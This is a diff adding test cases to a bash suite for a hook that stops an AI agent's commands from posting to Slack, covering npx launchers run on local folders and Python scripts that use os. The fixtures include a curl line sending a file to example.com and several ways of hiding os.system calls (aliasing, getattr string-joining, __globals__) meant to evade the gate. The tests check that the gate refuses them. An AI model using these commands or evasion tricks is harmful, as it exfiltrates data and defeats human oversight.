@@ -11,8 +11,10 @@
 # file replaces with vi.mock or jest.mock and a factory is not followed. And lib/data-names.py again
 # (#3050): the webhook's variable name where a JavaScript or TypeScript file only declares it, told
 # from where it is read. And lib/program-runs.py's package_run beside a folder or a file of the
-# package's name (#3069), kept here beside the other `npx vitest` cases. Every other judgement of
-# the gate is in test-slack-drafts-only-gate.sh,
+# package's name (#3069), kept here beside the other `npx vitest` cases, and beside a local package
+# folder a launcher is handed by path (#3083). And a Python script that uses os only to read, handed
+# a file naming an endpoint (#3085), kept here so the larger suite does not grow. Every other
+# judgement of the gate is in test-slack-drafts-only-gate.sh,
 # whose helpers below are copied as they are, so a case here is driven the same way: a hook payload
 # piped into slack-drafts-only-gate.sh, exit 0 allowed and 2 refused, the reason on stderr.
 set -uo pipefail
@@ -1152,6 +1154,55 @@ case "$ERR" in *"the package"*) check "#3069 a path's refusal does not call the 
   *) check "#3069 a path's refusal does not call the script a package" ok ;; esac
 
 echo
+echo "slack drafts only: a launcher handed a local package folder runs that package (claude-config#3083)"
+
+# Left by #3069, measured on main at 2963c2b: `npx ./vitest run posts.test.ts` beside a local package
+# folder ./vitest was read as that path alone. A folder is no script, so nothing was read and the test
+# file the package was handed was never opened. npm runs the package the folder holds (a word starting
+# with . / or ~ that names no archive is a folder to it), so the run is read as a package run too:
+# every file it is handed is judged against a program the gate cannot read. The same for every word a
+# launcher is handed that is no package name and no script on disk: the folder it runs in (.), a
+# folder an earlier command makes, a path naming nothing yet, an archive, and a GitHub shorthand
+# (owner/repo). A script on disk is still read as the script it is, as #3069 left it.
+printf '%s\n' '{"name": "vitest", "version": "1.0.0", "bin": "./cli.js"}' > "$PB/vitest/package.json"
+printf '%s\n' '#!/usr/bin/env node' 'console.log("quiet")' > "$PB/vitest/cli.js"
+printf '%s\n' '{"name": "tool", "version": "1.0.0", "bin": "./cli.js"}' > "$PB/tool/package.json"
+printf '%s\n' '{"name": "here", "version": "1.0.0", "bin": "./cli.js"}' > "$PB/package.json"
+ln -s vitest "$PB/linked"
+: > "$PB/pkg.tgz"
+for runs in "npx ./vitest run posts.test.ts" "npx ./vitest run imports-poster.test.ts" "npx -y ./vitest run posts.test.ts" \
+  "npx ./vitest/ run posts.test.ts" "npx $PB/vitest run posts.test.ts" "npm exec -- ./vitest run posts.test.ts" \
+  "npm x ./vitest run posts.test.ts" "pnpm dlx ./vitest run posts.test.ts" "yarn dlx ./vitest run posts.test.ts" \
+  "bunx ./vitest run posts.test.ts" "pnpx ./vitest run posts.test.ts" "npx ./tool msg.json" \
+  "npx ./tool --url https://hooks.slack.com/services/T0/B0/x" "npx . run posts.test.ts" "npx ./linked run posts.test.ts" \
+  "npx ./pkg.tgz run posts.test.ts" "npx ./nothing-there run posts.test.ts" "npx acme/tool-repo run posts.test.ts" \
+  "mkdir -p fresh && npx ./fresh run posts.test.ts"; do
+  run_pb "$runs"
+  read_refused "#3083 a launcher's run of a local package folder is read as a package run: $runs"
+done
+run_pb "npx ./vitest run posts.test.ts"
+says "#3083 the refusal names the folder as the package the launcher runs" "the package ./vitest, run by npx,"
+says "#3083 the refusal names the test file the package was handed" "posts.test.ts"
+run_pb "npx ./vitest run imports-poster.test.ts"
+says "#3083 a test file's imports are followed to the module that posts" "poster"
+# It refuses nothing more than a package run does: handed nothing naming an endpoint, the run passes.
+for runs in "npx ./vitest run quiet.test.ts" "npx ./vitest --version" "npm exec -- ./vitest run quiet.test.ts" \
+  "pnpm dlx ./vitest run quiet.test.ts" "npx ./tool quiet.json" "npx . run quiet.test.ts" \
+  "npx ./nothing-there run quiet.test.ts" "mkdir -p fresh && npx ./fresh run quiet.test.ts"; do
+  run_pb "$runs"
+  allowed "#3083 a launcher's run of a local package folder, handed nothing naming an endpoint, passes: $runs"
+done
+# The controls. A script on disk is read as the script it is, so a quiet one handed a data file naming
+# an endpoint still passes (#3069's own case, run again here beside the folders), as does one an
+# earlier command of the call writes; and a word the gate cannot work out is left as it was (#2683).
+run_pb "npx ./runner msg.json"
+allowed "#3083 a script on disk run through a launcher is still read as that script alone"
+run_pb "printf '%s\\n' '#!/bin/sh' 'echo quiet' > made.sh && npx ./made.sh msg.json"
+allowed "#3083 a script an earlier command writes, run through a launcher, is still read as that script alone"
+run_pb 'npx "$SOMEWHERE/tool" msg.json'
+allowed "#3083 a word the gate cannot work out is left as it was"
+
+echo
 echo "slack drafts only: a file that only declares the webhook's name is not one that posts (claude-config#3050)"
 
 # On 2026-11-15, in a work repository whose worker has a Slack module, three runs of test files by
@@ -1322,6 +1373,166 @@ run_mk "bash send.sh"
 refused "#3050 a shell script sending to what the variable holds is refused"
 run_mk "node -e 'const env = { SLACK_WEBHOOK_URL: null }; fetch(process.env.SLACK_WEBHOOK_URL)'"
 refused "#3050 and code given inline"
+
+echo
+echo "slack drafts only: a script that uses os only to read is one the gate has read end to end (claude-config#3085)"
+
+# The global rules file names chat.postMessage in its own Slack rule, so every script handed
+# payload/CLAUDE.md, or a copy of it, was refused as one that posts the moment it imported os: on
+# 2026-11-16 a measuring script, the #2575 trim script and a builder's plain read of the file. Across
+# this project's session records "imports os" was the commonest reason a script handed a data file
+# was refused (54 of the 213 such refusals found, measured 2026-11-16). Dan chose the rule that day:
+# trust only a program the gate can read end to end. So os is read as every other module is, use by
+# use: the names that read a file, a path or the environment (OS_READS) pass, and any other use of
+# os (a program started, a file written, os handed on or renamed) is refused as before, as is
+# anything the gate cannot follow. The file handed below is the real rules file beside this hooks
+# folder.
+RULES="$(cd "$DIR/.." && pwd)/CLAUDE.md"
+D85="$T/d3085"
+mkdir -p "$D85"
+printf '%s\n' '{"text": "hi", "url": "https://slack.com/api/chat.postMessage"}' > "$D85/msg.json"
+run_85() { run_raw "$(payload Bash "$(bash_input "$1")" "$D85")"; }
+printf '%s\n' 'import json, sys, urllib.request' 'urllib.request.urlopen(open(sys.argv[1]).read()[:40])' > "$D85/sends.py"
+run_85 "python3 sends.py $RULES"
+read_refused "#3085 the control: a script that can send, handed the real rules file, is refused"
+says "#3085 because the rules file names an endpoint, which is what makes the cases below a measurement" "CLAUDE.md, which names chat.postMessage"
+cat > "$D85/reads-os.py" <<'PY'
+import os, sys
+text = open(sys.argv[1]).read()
+here = os.path.dirname(os.path.abspath(sys.argv[1]))
+print(len(text), os.getcwd(), os.environ.get("HOME"), os.getenv("USER"), os.sep, os.name)
+for name in sorted(os.listdir(here)):
+    print(name, os.stat(os.path.join(here, name)).st_size)
+for root, dirs, files in os.walk(here):
+    print(root, len(files))
+PY
+cat > "$D85/reads-os-as.py" <<'PY'
+import os as o, sys
+print(o.path.getsize(sys.argv[1]), o.getpid(), o.access(sys.argv[1], o.R_OK), [e.name for e in o.scandir(".")])
+PY
+cat > "$D85/reads-from-os.py" <<'PY'
+import sys
+from os import environ, getcwd, listdir, path
+print(path.basename(sys.argv[1]), getcwd(), environ.get("HOME"), len(listdir(".")), len(open(sys.argv[1]).read()))
+PY
+cat > "$D85/reads-ospath.py" <<'PY'
+import os.path, sys
+print(os.path.getsize(sys.argv[1]), os.getcwd())
+PY
+cat > "$D85/lib_sizes.py" <<'PY'
+import os
+def size(p):
+    return os.stat(p).st_size
+PY
+cat > "$D85/reads-via.py" <<'PY'
+import sys
+import lib_sizes
+print(lib_sizes.size(sys.argv[1]))
+PY
+for reads in reads-os.py reads-os-as.py reads-from-os.py reads-ospath.py reads-via.py; do
+  run_85 "python3 $reads $RULES"
+  allowed "#3085 a script that uses os only to read, handed the real rules file: $reads"
+  run_85 "python3 $reads msg.json"
+  allowed "#3085 the same script handed a data file naming the endpoint: $reads"
+done
+run_85 "python3 -c 'import os, sys; print(os.path.getsize(sys.argv[1]), os.getcwd())' $RULES"
+allowed "#3085 code given inline that uses os only to read, handed the real rules file"
+run_85 "python3 - $RULES <<'PY'
+import os, sys
+print(len(open(sys.argv[1]).read()), os.getcwd())
+PY"
+allowed "#3085 code fed on standard input that uses os only to read, handed the real rules file"
+# Everything else os can do is still refused, each handed the same file: a program started every
+# way os offers, os handed on, renamed or reached through another name, a file written or removed
+# (writing counts for a script file, as it does without os), and a module beside the script that
+# does any of it. Each says what it found, so the script is fixed rather than moved.
+w85() { local name="$1"; shift; printf '%s\n' "$@" > "$D85/$name"; }
+w85 os-system.py 'import os, sys' 'os.system("curl -d @" + sys.argv[1] + " https://example.com")'
+w85 os-popen.py 'import os, sys' 'os.popen("bash " + sys.argv[1])'
+w85 os-exec.py 'import os, sys' 'os.execvp("bash", ["bash", sys.argv[1]])'
+w85 os-spawn.py 'import os, sys' 'os.posix_spawn("/bin/bash", ["bash", sys.argv[1]], os.environ)'
+w85 os-fork.py 'import os, sys' 'if os.fork() == 0:' '    print(open(sys.argv[1]).read())'
+w85 os-startfile.py 'import os, sys' 'os.startfile(sys.argv[1])'
+w85 os-alias.py 'import os, sys' 'tool = os' 'tool.system("bash " + sys.argv[1])'
+w85 os-passed.py 'import os, sys' 'def go(m):' '    m.system("bash " + sys.argv[1])' 'go(os)'
+w85 os-getattr.py 'import os, sys' 'getattr(os, "sys" + "tem")("bash " + sys.argv[1])'
+w85 os-as.py 'import os as o, sys' 'o.system("bash " + sys.argv[1])'
+w85 os-from.py 'import sys' 'from os import system' 'system("bash " + sys.argv[1])'
+w85 os-from-star.py 'import sys' 'from os import *' 'system("bash " + sys.argv[1])'
+w85 os-pathos.py 'import os, sys' 'os.path.os.system("bash " + sys.argv[1])'
+w85 os-dunder.py 'import os, sys' 'os.walk.__globals__["system"]("bash " + sys.argv[1])'
+w85 os-remove.py 'import os, sys' 'os.remove(sys.argv[1])'
+w85 os-rename.py 'import os, sys' 'os.rename(sys.argv[1], "/tmp/run-later.sh")'
+w85 os-open.py 'import os, sys' 'fd = os.open("/tmp/run-later.sh", os.O_WRONLY | os.O_CREAT)' 'os.write(fd, open(sys.argv[1], "rb").read())'
+w85 os-symlink.py 'import os, sys' 'os.symlink(sys.argv[1], "/tmp/run-later.sh")'
+w85 os-chmod.py 'import os, sys' 'os.chmod(sys.argv[1], 0o755)'
+w85 os-putenv.py 'import os, sys' 'os.putenv("BASH_ENV", sys.argv[1])'
+w85 os-ospath-only.py 'import os.path, sys' 'os.system("bash " + sys.argv[1])'
+w85 os-subprocess.py 'import os, subprocess, sys' 'subprocess.run(["bash", sys.argv[1]], cwd=os.getcwd())'
+w85 os-unparsed.py 'import os, sys' 'print(os.getcwd(' 'os.system("bash " + sys.argv[1])'
+w85 os-unplaced.py 'import os, sys' 'import no_such_module_3085' 'print(os.getcwd())'
+w85 lib_runner.py 'import os' 'def go(p):' '    os.system("bash " + p)'
+w85 os-via.py 'import sys' 'import lib_runner' 'lib_runner.go(sys.argv[1])'
+for acts in os-system.py os-popen.py os-exec.py os-spawn.py os-fork.py os-startfile.py os-alias.py os-passed.py \
+  os-getattr.py os-as.py os-from.py os-from-star.py os-pathos.py os-dunder.py os-remove.py os-rename.py \
+  os-open.py os-symlink.py os-chmod.py os-putenv.py os-ospath-only.py os-subprocess.py os-unparsed.py \
+  os-unplaced.py os-via.py; do
+  run_85 "python3 $acts $RULES"
+  read_refused "#3085 a script that uses os for more than reading, handed the real rules file, is still refused: $acts"
+done
+run_85 "python3 os-system.py $RULES"
+says "#3085 the refusal names the use of os that is more than reading" "uses os for more than reading files, paths and the environment (os.system)"
+run_85 "python3 os-alias.py $RULES"
+says "#3085 and os handed on under another name" "uses os for more than reading files, paths and the environment (os, handed on or renamed)"
+run_85 "python3 os-remove.py $RULES"
+says "#3085 and a removal, which is a write" "(os.remove)"
+run_85 "python3 os-via.py $RULES"
+says "#3085 and a module beside the script that starts a program" "lib_runner.py"
+run_85 "python3 -c 'import os, sys; os.system(\"bash \" + sys.argv[1])' $RULES"
+read_refused "#3085 code given inline that starts a program through os, handed the real rules file, is still refused"
+# Code a shell script writes inline keeps the wider list it had (OS_FILES, claude-config#2446), where
+# writing a file is not counted: os.remove passes there and os.system does not, as before.
+cat > "$D85/inline-remove.sh" <<'SH'
+#!/bin/bash
+python3 - "$1" <<'PY'
+import os, sys
+print(len(open(sys.argv[1]).read()))
+os.remove("/tmp/scratch-3085.txt")
+PY
+SH
+cat > "$D85/inline-system.sh" <<'SH'
+#!/bin/bash
+python3 - "$1" <<'PY'
+import os, sys
+os.system("bash " + sys.argv[1])
+PY
+SH
+run_85 "bash inline-remove.sh $RULES"
+allowed "#3085 code a shell script writes inline may still remove a file through os, as before"
+run_85 "bash inline-system.sh $RULES"
+read_refused "#3085 and still may not start a program through it"
+says "#3085 in the words that refusal had before" "uses os for more than its file, path and environment calls"
+# What the gate cannot follow is still refused, which is the other half of Dan's rule: a shell
+# script whose loop reads the file it is handed, and asks a library it sources about each line
+# (the push gates builder's measuring script, 2026-11-16, refused over a file of command texts
+# naming an endpoint). The loop's reads, and what a sourced library's functions do with what they
+# are handed, are two things the gate does not read, so this is not one it has read end to end.
+printf '%s\n' 'is_push() { grep -Eq "git push" <<< "$1"; }' > "$D85/questions.sh"
+printf '%s\n' 'curl -s https://slack.com/api/chat.postMessage -d text=hi' 'git push origin main' > "$D85/commands.txt"
+cat > "$D85/routes.sh" <<SH
+#!/usr/bin/env bash
+set -u
+IN="\$1"
+. $D85/questions.sh || exit 2
+count=0
+while IFS= read -r cmd; do
+  is_push "\$cmd" && count=\$((count + 1))
+done < "\$IN"
+echo "pushes: \$count"
+SH
+run_85 "bash routes.sh commands.txt"
+read_refused "#3085 a shell script whose loop reads the file it is handed is still refused: the gate does not follow the loop"
+says "#3085 and the refusal says that is why" "a loop or block whose reads the gate does not follow"
 
 echo
 
